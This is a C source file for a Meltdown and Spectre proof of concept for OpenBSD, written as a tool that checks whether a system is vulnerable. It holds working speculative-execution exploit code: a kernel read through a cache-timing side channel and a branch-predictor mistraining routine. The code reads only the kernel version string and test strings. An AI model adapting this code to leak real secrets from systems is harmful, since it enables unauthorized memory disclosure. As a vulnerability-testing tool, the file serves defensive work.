/*
 * Meltdown & Spectre PoC for OpenBSD
 * Copyright (c) 2018 genua GmbH
 *
 * Permission to use, copy, modify, and distribute this software for any
 * purpose with or without fee is hereby granted, provided that the above
 * copyright notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
 * WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
 * ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
 * WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
 * ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 */
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <err.h>
#include <setjmp.h>
#include <unistd.h>
#include <sys/param.h>
#include <sys/sysctl.h>
#include <sched.h>
#include <ctype.h>
#include <paths.h>
#include <nlist.h>
#include <fcntl.h>
#include <limits.h>

#include "util.h"

#define VALUES_PER_BYTE		(1 << CHAR_BIT)

enum vuln {
	NONE = -1,
	MELTDOWN = 0,
	SPECTRE = 1
};

unsigned	 cache_hit_threshold;
int		 minrounds = 1;
int		 maxrounds = 10000;
unsigned	 blocksize;
int		 nblocks;
volatile uint8_t *blocks;	/* nblocks * blocksize */
int		 cachehits[VALUES_PER_BYTE];
int		 ncachehits;
sigjmp_buf	 buf;
int		 verbose = 0;
volatile uint8_t junk = 0;


int		 versionmib[2] = { CTL_KERN, KERN_VERSION };

char		*meltdown_pattern =
			"Meltdown expected, the wheat is growin' thin";
char		*spectre_pattern =
			"Special Executive for Counterintelligence, Terrorism, Revenge and Extortion.";


unsigned	*spectre_array1sz = NULL;
uint8_t		*spectre_array1 = NULL;
uint8_t		*spectre_array2 = NULL;
char		*spectre_secret = NULL;

void
exception(int sig)
{
	unsigned t;
	int	i;

	for (i = 0; i < VALUES_PER_BYTE; i++) {
		t = timedaccess(&blocks[i * blocksize]);
		if (t < cache_hit_threshold) {
			ncachehits++;
			cachehits[i]++;
		}
	}
	siglongjmp(buf, 1);
}

void
meltdown(int round, uint8_t *addr)
{
	size_t vlen;

	/*
	 * Query length of version string. The kernel will call strlen() on
	 * version[] and as a side effect, the data is stored in the cache.
	 */
	vlen = 0;
	if (sysctl(versionmib, 2, NULL, &vlen, NULL, 0) == -1)
		err(1, "sysctl");

	if (!sigsetjmp(buf, 1)) {
		/*
		 * Raise exception ...
		 */
		*((volatile int *)NULL) = 42;

		/*
		 * NOTREACHED
		 *
		 * The statement below accesses a kernel address. Due the the
		 * exception generated above, it is never reached.
		 * However, the speculative execution of the CPU might have
		 * loaded the value at the kernel address anyway. As a side
		 * effect, the beginning of one of our 256 blocks will be
		 * loaded into the cache.
		 */
		junk = blocks[(*(addr)) * blocksize];
	}
}

void
meltdown_test(int round, uint8_t *addr)
{
	junk = strlen(meltdown_pattern);
	if (!sigsetjmp(buf, 1)) {
		*((volatile int *)NULL) = 42;
		/*NOTREACHED*/
		junk = blocks[(*(addr)) * blocksize];
	}
}

void
victim_function(size_t x)
{
	if (x < *spectre_array1sz)
		junk &= spectre_array2[spectre_array1[x] * blocksize];
}

/*
 * Based on https://gist.github.com/jedisct1/3bbb6e50b768968c30629bf734ea49c6
 */
void
spectre(int round, uint8_t *addr)
{
	size_t	 malicious_x = (size_t)addr;
	size_t	 training_x, x;
	unsigned t;
	int	 i;

	/*
	 * One training cycle will use (TRAINING_CYCLE-1) times 'training_x'
	 * and once 'malicious_x'.
	 */
#define TRAINING_CYCLE	6
#define	SPECTRE_LOOPS	(TRAINING_CYCLE * 20)
	training_x = round % *spectre_array1sz;
	for (i = SPECTRE_LOOPS - 1; i >= 0; i--) {
		cache_flush(spectre_array1sz);
#if 0 /* somehow we don't need this */
		pipeline_flush();
#endif

		/*
		 * Pick 'training_x' or 'malicious_x'.
		 * Avoid jumps in case those tip off the branch
		 * predictor
		 */
		/* Set x = fff...ff0000 if (i % 6) == 0, else x = 0 */
		x = ((i % TRAINING_CYCLE) - 1) & ~0xffff;

		/* Set x = -1 if (i & TRAINING_CYCLE) = 0, else x = 0 */
		x = (x | (x >> 16));

		x = training_x ^ (x & (malicious_x ^ training_x));

		/* Call the victim! */
		victim_function(x);
	}

	/* XXX fix the case of zero. For now, just exclude it */
	for (i = 1; i < VALUES_PER_BYTE; i++) {
		t = timedaccess(&spectre_array2[i * blocksize]);
		if (t < cache_hit_threshold &&
		    i != spectre_array1[training_x]) {
			ncachehits++;
			cachehits[i]++;
		}
	}
}

int
probability(enum vuln vuln, int kernel, int maxlen)
{
	int	 n, len;
	uint8_t	*addr = NULL;
	int	 i;
	int	 round;
	struct nlist nl[2] = { { "_version" }, { NULL } };
	int	 nsym;
	char	*expected;
	size_t	 vlen;
	void	(*poc)(int, uint8_t *);
	int	*resultstr;
	int	 value, nhits;
#define BPL	16
	char	 ascii[BPL + 1];
	int	 aix = 0;
	int	 nmatch;
	int	 perc;

	blocksize = getpagesize();
	switch (vuln) {
	case MELTDOWN:
		nblocks = VALUES_PER_BYTE;
		break;
	case SPECTRE:
		nblocks = VALUES_PER_BYTE + 2;
#ifdef __PPC__
		/* XXX can't explain why pagesize won't work here */
		blocksize = 512;
#endif
		break;
	default:
		return -1;
	}
	if ((blocks = calloc(nblocks, blocksize)) == NULL)
		err(1, "malloc");
	if ((unsigned long)blocks % blocksize)
		errx(1, "addr %p is not page-aligned", blocks);

	switch (vuln) {
	case MELTDOWN:
		if (kernel) {
			/*
			 * Get kernel address of version[].
			 */
			if ((nsym = nlist(_PATH_KSYMS, nl)) == -1)
				err(1, "%s", _PATH_KSYMS);
			else if (nsym != 0 ||
			    (addr = (uint8_t *)nl[0].n_value) == NULL)
				errx(1, "kernel symbol '%s' not found",
				    nl[0].n_name);

			if (verbose)
				printf("Using addr %p for symbol '%s'.\n", addr,
				    nl[0].n_name);

			vlen = 0;
			if (sysctl(versionmib, 2, NULL, &vlen, NULL, 0) == -1)
				err(1, "sysctl");
			if (vlen == 0)
				errx(1, "empty version string");
			len = (int)vlen;
			poc = meltdown;
		} else {
			addr = meltdown_pattern;
			len = strlen(addr);
			poc = meltdown_test;
		}
		signal(SIGSEGV, exception);
		break;
	case SPECTRE:
		/*
		 * Layout is:
		 *	Offset		Description
		 *	--------------------------------------------------------
		 *	0		Size of first array
		 *	cachelinesz	1st array: with indices into 2nd one
		 *	blocksize	2nd array[VALUES_PER_BYTE * blocksize]
		 *			Secret string
		 */
		spectre_array1sz = (unsigned *)blocks;
		*spectre_array1sz = VALUES_PER_BYTE;
		spectre_array1 = (uint8_t *)(blocks + CACHELINESIZE);
		for (i = 0; i < (int)*spectre_array1sz; i++)
			spectre_array1[i] = i + 1;
		spectre_array2 = (uint8_t *)blocks + blocksize;
		spectre_secret = spectre_array2 + VALUES_PER_BYTE * blocksize;
		strlcpy(spectre_secret, spectre_pattern, blocksize);
		addr = (uint8_t *)(unsigned long)(spectre_secret -
		    (char *)spectre_array1);
		len = strlen(spectre_secret);
		poc = spectre;
		break;
	default:
		return -1;
	}
	if ((resultstr = calloc(len + 1, sizeof (*resultstr))) == NULL)
		err(1, "malloc");

	len = MIN(len, maxlen);
	for (n = 0; n < len; n++) {
		ncachehits = 0;
		memset(cachehits, 0, sizeof(cachehits));

		/*
		 * One round per address to be read should be enough;
		 * but multiple rounds can help to filter clutter.
		 *
		 * Do at least 'minround' rounds and at most 'maxround' rounds.
		 * In between min and max, stop if we have at least one cache
		 * hit.
		 */
		for (round = 0;
		    round < minrounds || (round < maxrounds && ncachehits == 0);
		    round++) {
			sched_yield();
			for (i = 0; i < nblocks; i++)
				cache_flush(&blocks[i * blocksize]);

			/* Execute the PoC */
			poc(round, addr);
		}

		/*
		 * Now check which block's beginning is in the cache.
		 */
		value = -1;
		for (i = 0, nhits = 0; i < VALUES_PER_BYTE; i++) {
			if (cachehits[i]) {
				if (nhits++ == 0 ||
				    cachehits[i] > cachehits[value])
					value = i;
			}
		}
		resultstr[n] = value;
		if (verbose > 3 && nhits > 1) {
			printf("Warning: got %d different hits at offset %d\n",
			    nhits, n);
			if (verbose > 5) {
				printf("Alternatives at offset %d:", n);
				for (i = 0; i < VALUES_PER_BYTE; i++) {
					if (cachehits[i])
						printf(" 0x%02x (%c, n=%u)", i,
						    isprint(i) ? i : '.',
						    cachehits[i]);

				}
			}
		}

		if (verbose) {
			if ((n % BPL) == 0) {
				if (n > 0) {
					ascii[aix] = 0;
					printf("   %s\n", ascii);
					aix = 0;
				}
				printf("%04x   ", n);
			}
			if (value == -1) {
				ascii[aix++] = '?';
				printf(" ??");
			} else {
				ascii[aix++] = isprint(value) ? value : '.';
				printf(" %02x", value);
			}
		}
		addr++;
	}
	if (verbose && aix > 0) {
		ascii[aix] = 0;
		while (aix++ < BPL)
			printf("   ");
		printf("   %s\n", ascii);
	}

	/*
	 * Compare what we found with expected value.
	 * For meltdown, this is the first time, the "real" version string
	 * is loaded into our address space.
	 */
	switch (vuln) {
	case MELTDOWN:
		if (kernel) {
			if ((expected = calloc(vlen + 1, sizeof (*expected))) ==
			    NULL)
				err(1, "malloc");
			if (sysctl(versionmib, 2, expected, &vlen, NULL, 0) ==
			    -1)
				err(1, "sysctl");
		} else
			expected = meltdown_pattern;
		break;
	case SPECTRE:
		expected = spectre_pattern;
		break;
	default:
		return -1;
	}

	for (i = 0, nmatch = 0; i < len; i++) {
		if (expected[i] == resultstr[i])
			nmatch++;
	}
	perc = 100 * nmatch / len;
	if (verbose)
		printf("matched %d%% (%d of %d bytes)\n", perc, nmatch, len);
	free((void *)blocks);
	free(resultstr);
	if (expected != meltdown_pattern && expected != spectre_pattern)
		free(expected);
	return perc;
}

void
describesystem()
{
	struct sc {
		int	 mib[2];
		char	*label;
	} sc[] = {
		{ { CTL_KERN, KERN_OSTYPE }, "os" },
		{ { CTL_KERN, KERN_OSRELEASE }, NULL },
		{ { CTL_HW, HW_PRODUCT }, "product" },
		{ { CTL_HW, HW_VERSION }, "version" },
		{ { CTL_HW, HW_MACHINE }, "machine" },
		{ { CTL_HW, HW_MODEL }, "cpu" },
	};
	int	 i;
	char	*val;
	size_t	 len;

	for (i = 0; i < (int)nitems(sc); i++) {
		len = 0;
		if (sysctl(sc[i].mib, 2, NULL, &len, NULL, 0) == -1)
			continue;
		val = calloc(len, sizeof (*val));
		if (sysctl(sc[i].mib, 2, val, &len, NULL, 0) == -1)
			err(1, "sysctl(%d)", i);
		if (sc[i].label)
			printf("%s%s = ", i == 0 ? "" : ", ", sc[i].label);
		else
			printf(" ");
		printf("%s", val);
		free(val);
	}
}

int
main(int argc, char **argv)
{
	int	 o;
	enum vuln vulns[] = { [MELTDOWN] = NONE, [SPECTRE] = NONE };
	const char *vname[] = {
	    [MELTDOWN] = "meltdown", [SPECTRE] = "spectre" };
	int	 kernel = 1;
	int	 maxlen = INT_MAX;
	int	 v;
	int	 perc;
	char	*what;
	int	 identify = 0;
	int	 ret = 0;

	setprogname(argv[0]);
	while ((o = getopt(argc, argv, "msin:qTt:v")) != EOF) {
		switch (o) {
		case 'm':
			vulns[MELTDOWN] = MELTDOWN;
			break;
		case 's':
			vulns[SPECTRE] = SPECTRE;
			break;
		case 'i':
			identify++;
			break;
		case 'n':
			minrounds = atoi(optarg);
			break;
		case 'q':
			/* quick mode */
			maxrounds = 1000;
			maxlen = 10;
			break;
		case 'T':
			/*
			 * Meltdown test mode: don't read kmem but from our own
			 * internal memory
			 */
			kernel = 0;
			break;
		case 't':
			cache_hit_threshold = atoi(optarg);
			break;
		case 'v':
			verbose++;
			break;
		default:
		usage:
			fprintf(stderr,
			    "usage: %s [-ms] [-iqvT] [-n minrounds] "
			    "[-t threshold]\n", getprogname());
			return 2;
		}
	}
	if (argc != optind)
		goto usage;

	if (vulns[MELTDOWN] == NONE && vulns[SPECTRE] == NONE) {
		vulns[MELTDOWN] = MELTDOWN;
		vulns[SPECTRE] = SPECTRE;
	}


	calibrate_clock(verbose,
	    cache_hit_threshold ? NULL : &cache_hit_threshold);

	for (v = 0; v < (int)nitems(vulns); v++) {
		if (vulns[v] == NONE)
			continue;

		perc = probability(vulns[v], kernel, maxlen);
		if (vulns[v] == MELTDOWN && !kernel)
			what = "CPU";
		else
			what = "System";
		if (perc >= 66) {
			printf("%s is vulnerable to %s", what, vname[vulns[v]]);
			ret += 42;
		} else if (perc >= 10) {
			printf("%s with %d%% probability vulnerable to %s",
			    what, perc, vname[vulns[v]]);
			ret += 41;
		} else
			printf("%s is not vulnerable to %s", what,
			    vname[vulns[v]]);
		if (identify == 2) {
			/* System description on every line */
			printf(" (");
			describesystem();
			printf(")");
		}
		printf("\n");
	}
	if (identify == 1) {
		describesystem();
		printf("\n");
	}
	return ret;
}
